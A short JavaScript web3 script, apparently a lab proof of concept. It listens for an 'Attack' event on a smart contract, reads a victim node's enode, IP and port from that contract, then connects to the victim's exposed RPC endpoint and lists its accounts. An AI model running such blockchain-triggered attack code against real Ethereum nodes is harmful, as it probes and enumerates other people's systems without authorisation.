var Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8546"));


var Address = '0x67a7e88a8cb14dc5f28f8297737b83e69d91e687';
var abi = JSON.parse( '{ "contractName": "ASC", "abi": [ { "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [ { "indexed": false, "name": "msg", "type": "string" } ], "name": "Attack", "type": "event" }, { "constant": false, "inputs": [ { "name": "_victimEnode", "type": "string" }, { "name": "_victimIP", "type": "string" }, { "name": "_victimPort", "type": "string" } ], "name": "set", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "get", "outputs": [ { "name": "", "type": "string" }, { "name": "", "type": "string" }, { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" } ] }');


var cont = web3.eth.contract( abi.abi ).at( Address );

//web3.eth.getAccounts(console.log);

var trigger = cont.Attack();

trigger.watch(function(err, result){
  if(!err){
    var info = cont.get();
    console.log('Obtaining Bobs Information\n');
    attack(info[0], info[1], info[2]);
  }
});


function attack(enode, ip, port){
//change web3 provider to bob
//issue web3 commands
  console.log("Attacking Bob\n");
  var address = "http://" + ip + ":" + port;
  const bob_web3 = new Web3(new Web3.providers.HttpProvider(address));
  bob_web3.eth.getAccounts(console.log);
}
